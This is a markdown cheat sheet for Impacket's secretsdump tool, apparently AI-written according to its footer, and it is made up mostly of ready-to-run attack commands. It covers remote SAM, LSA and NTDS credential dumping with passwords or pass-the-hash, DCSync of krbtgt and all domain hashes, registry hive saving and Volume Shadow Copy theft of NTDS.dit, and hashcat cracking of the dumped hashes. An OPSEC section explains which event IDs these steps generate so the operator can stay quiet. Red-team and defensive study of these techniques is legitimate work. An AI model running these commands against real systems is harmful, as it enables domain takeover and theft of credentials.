# secretsdump

**Tags:** `#secretsdump` `#impacket` `#credentialdumping` `#activedirectory` `#windows` `#dcsync` `#postexploitation` `#remote`

Impacket's all-in-one credential extraction tool. Dumps SAM hashes, LSA secrets, cached domain credentials, NTDS.dit (domain hashes), and Kerberos keys — both remotely over SMB/WMI and locally from saved registry hives. The go-to remote credential dump tool when you have admin credentials or a hash to PTH with. Does DCSync without needing Mimikatz on the target.

**Source:** Part of Impacket — pre-installed on Kali
**Install:** `pip install impacket` or `sudo apt install python3-impacket`

```bash
# Remote dump — admin creds
secretsdump.py DOMAIN/user:Password@<target-ip>

# Remote dump — PTH (no plaintext needed)
secretsdump.py -hashes :NTLMhash DOMAIN/user@<target-ip>
```

> [!note] **secretsdump vs Mimikatz** — secretsdump runs entirely from your attack box over the network — no binary touches the target beyond what SMB/WMI normally does. Mimikatz requires execution on the target. Use secretsdump when you have valid creds/hash and want minimal footprint. Use Mimikatz when you need live LSASS (WDigest, Kerberos tickets, DPAPI).

---

## Remote Dump (Admin Access Required)

```bash
# Full dump — SAM + LSA + cached + NTDS (if DC)
secretsdump.py DOMAIN/Administrator:Password@192.168.1.10

# Pass the Hash — NTLM auth
secretsdump.py -hashes :aad3b435b51404eeaad3b435b51404ee:NTLMhash DOMAIN/Administrator@192.168.1.10

# Just SAM (local accounts only)
secretsdump.py DOMAIN/user:Password@192.168.1.10 -just-dc-user Administrator

# Use Kerberos auth (if you have a TGT / ccache file)
KRB5CCNAME=ticket.ccache secretsdump.py -k -no-pass DOMAIN/user@dc01.domain.local

# Target specific DC for DCSync
secretsdump.py DOMAIN/user:Password@dc01.domain.local -just-dc

# Output to file
secretsdump.py DOMAIN/user:Password@192.168.1.10 -outputfile /tmp/dump
```

---

## DCSync — Domain Hash Dump

Performs DCSync (replication) against a DC — dumps all domain hashes without touching LSASS on the DC. Requires Domain Admin, Domain Controller, or an account with `Replicating Directory Changes All` rights.

```bash
# Dump all domain hashes via DCSync
secretsdump.py DOMAIN/Administrator:Password@dc01.domain.local -just-dc

# Dump a single user's hash
secretsdump.py DOMAIN/Administrator:Password@dc01.domain.local -just-dc-user krbtgt
secretsdump.py DOMAIN/Administrator:Password@dc01.domain.local -just-dc-user Administrator

# PTH DCSync
secretsdump.py -hashes :NTLMhash DOMAIN/Administrator@dc01.domain.local -just-dc

# DCSync with Kerberos
KRB5CCNAME=admin.ccache secretsdump.py -k -no-pass DOMAIN/Administrator@dc01.domain.local -just-dc

# Include Kerberos keys (AES128/AES256) in addition to NTLM
secretsdump.py DOMAIN/Administrator:Password@dc01.domain.local -just-dc -pwd-last-set -history
```

**Output format:**
```
DOMAIN\Administrator:500:aad3b435b51404eeaad3b435b51404ee:NTLMhash:::
DOMAIN\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:krbtgt_hash:::
```

---

## Local Dump — Offline Hive Files

When you've already pulled registry hives (via reg save, Volume Shadow Copy, etc.) and want to parse them locally on Kali.

```bash
# Dump from saved hives (no network needed)
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# Parse NTDS.dit + SYSTEM hive (DC offline dump)
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

# NTDS.dit + SYSTEM with history
secretsdump.py -ntds ntds.dit -system SYSTEM -history LOCAL

# Just LSA secrets from hives
secretsdump.py -security security.save -system system.save LOCAL
```

**Collecting hives remotely first (then parse locally):**
```bash
# On target via evil-winrm, cmd, or psexec
reg save HKLM\SAM C:\Windows\Temp\sam.save
reg save HKLM\SECURITY C:\Windows\Temp\security.save
reg save HKLM\SYSTEM C:\Windows\Temp\system.save

# Then exfil and parse
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

---

## Volume Shadow Copy — NTDS.dit Extraction

```bash
# On DC — create VSS snapshot and copy NTDS.dit
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM

# Then parse offline
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

```powershell
# PowerShell VSS copy
$vss = Get-WmiObject -Class Win32_ShadowCopy | Select-Object -Last 1
$path = $vss.DeviceObject + "\Windows\NTDS\ntds.dit"
cmd /c "copy $path C:\Temp\ntds.dit"
```

---

## What Gets Dumped

| Data | Source | Notes |
|---|---|---|
| SAM hashes | Registry SAM hive | Local accounts only |
| LSA secrets | Registry SECURITY hive | Service account plaintext, machine account hash, cached creds |
| Cached domain creds | Registry SECURITY hive | DCC2 hashes — slow to crack |
| NTDS domain hashes | NTDS.dit (DCSync or file) | All domain user NTLM + Kerberos keys |
| `$MACHINE.ACC` | LSA secrets | Computer account hash — usable for Silver Tickets |
| `_SC_*` entries | LSA secrets | Service account plaintext passwords |
| `DPAPI_SYSTEM` | LSA secrets | DPAPI master key seed |
| `DefaultPassword` | LSA secrets | AutoLogon plaintext password |

---

## Cracking Dumped Hashes

```bash
# Extract just NTLM hashes from secretsdump output
grep -oP ':[0-9a-f]{32}:::' dump.txt | cut -d: -f2 | sort -u > ntlm_hashes.txt

# Or use awk on standard output format
awk -F: '{print $4}' dump.ntds | sort -u > ntlm_hashes.txt

# Crack with hashcat (NTLM = mode 1000)
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Crack DCC2 cached domain credentials (mode 2100) — slow
hashcat -m 2100 cached_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Through a Proxy / Pivot

```bash
# Proxychains (SOCKS pivot)
proxychains secretsdump.py DOMAIN/user:Password@192.168.10.5

# Specify DC IP for name resolution issues
secretsdump.py DOMAIN/user:Password@dc01.domain.local -dc-ip 192.168.1.1
```

---

## Common Flags

| Flag | Description |
|---|---|
| `-just-dc` | DCSync only (NTDS hashes) |
| `-just-dc-user <user>` | DCSync single user |
| `-history` | Include password history |
| `-pwd-last-set` | Show password last set timestamp |
| `-hashes LM:NT` | PTH authentication |
| `-k` | Kerberos auth (use with KRB5CCNAME) |
| `-no-pass` | No password (use with `-k`) |
| `-dc-ip <ip>` | Specify DC IP |
| `-outputfile <file>` | Write output to file (creates `.sam`, `.ntds`, `.secrets`) |
| `LOCAL` | Parse local files instead of connecting remotely |

---

## OPSEC Notes

- Remote secretsdump uses SMB (445) + SVCCTL / SAMR / DRSUAPI — leaves Event ID 4624 (logon) and 4648 (explicit creds) on the target
- DCSync generates Event ID **4662** on the DC (`DS-Replication-Get-Changes-All`) — heavily monitored in mature environments
- Local hive parsing generates zero network noise — preferred if you already have the files
- `secretsdump` with `-just-dc` is noisier than targeted `-just-dc-user` — use targeted if you only need specific accounts (e.g., `krbtgt`)

---

*Created: 2026-03-06*
*Updated: 2026-03-06*
*Model: claude-sonnet-4-6*
